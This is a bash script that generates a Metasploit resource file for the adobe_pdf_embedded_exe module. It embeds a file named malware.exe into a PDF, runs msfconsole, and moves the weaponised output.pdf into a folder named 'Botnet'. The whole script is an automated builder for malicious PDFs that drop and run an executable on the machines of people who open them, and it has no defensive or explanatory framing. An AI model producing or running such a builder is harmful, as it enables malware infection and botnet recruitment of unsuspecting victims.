#!/bin/bash
rm PDF.rc

echo ""

# echo "clear" > PDF.rc
echo "use exploit/windows/fileformat/adobe_pdf_embedded_exe" >> PDF.rc
echo "set FILENAME output.pdf" >> PDF.rc
echo "set INFILENAME /root/Bureau/Exploits/Botnet/Tools/random.pdf " >> PDF.rc
echo "set PAYLOAD generic/custom" >> PDF.rc
echo "set PAYLOADFILE /root/Bureau/Exploits/Botnet/Bin/malware.exe" >> PDF.rc
echo "exploit" >> PDF.rc
echo "quit" >> PDF.rc

msfconsole -r PDF.rc

mv /root/.msf4/local/output.pdf /root/Bureau/Exploits/Botnet/output.pdf

echo ""
